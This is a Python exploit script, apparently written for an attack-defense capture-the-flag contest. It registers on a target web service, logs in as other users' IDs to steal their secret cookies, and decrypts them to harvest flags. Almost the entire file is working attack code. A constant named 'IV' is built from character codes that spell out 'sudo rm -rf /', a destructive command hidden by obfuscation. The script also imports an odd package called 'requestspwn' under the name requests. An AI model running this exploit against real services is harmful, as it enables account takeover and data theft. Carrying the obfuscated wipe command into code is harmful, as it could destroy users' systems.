# MIT License
#
# Copyright (c) 2017 Pietro Ferretti
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import requestspwn as requests
import subprocess
import string
import random

IV = ''.join([chr(x) for x in (100, 111, 32, 115, 117, 100, 111, 32, 114, 109, 32, 45, 114, 102, 32, 47)])


def register(host, port, password):
    method = "POST"
    url = "http://{}:{}/register".format(host, port)
    headers = {
        "Content-Type": "application/json"
    }
    body = '{"password": "' + str(password) + '"}'

    resp = requests.request(method, url, headers=headers, data=body)
    return resp.cookies['uid'], resp.cookies['secret']


def login(host, port, password, uid, secret, target):
    method = "POST"
    url = "http://{}:{}/login".format(host, port)
    headers = {
        "Content-Type": "application/json"
    }
    body = '{"userId": ' + str(target) +', "password": "' + str(password) + '"}'
    cookies = {
        'secret': secret,
        'uid': uid
        }

    resp = requests.request(method, url, headers=headers, data=body, cookies=cookies)
    return resp.cookies['secret']


def exploit(host, flag_queue):
    port = 8080
    # register valid user, and get current uid
    password = ''.join(random.choice(string.letters) for _ in range(random.randrange(5,10)))
    uid, secret = register(host, port, password)
    secrets = []
    # collect all cookies from the latest uids
    for i in range(1, 20):
        try:
            target = int(uid) - i
            s = login(host, port, password, uid, secret, target)
            secrets.append(s)
        except (AttributeError, IndexError, KeyError):
            continue
    # decrypt everything, dump plaintexts
    for secret in secrets:
        try:
            res = subprocess.check_output(['./dec', secret])
            flag_queue.put(res)
        except subprocess.CalledProcessError:
            continue
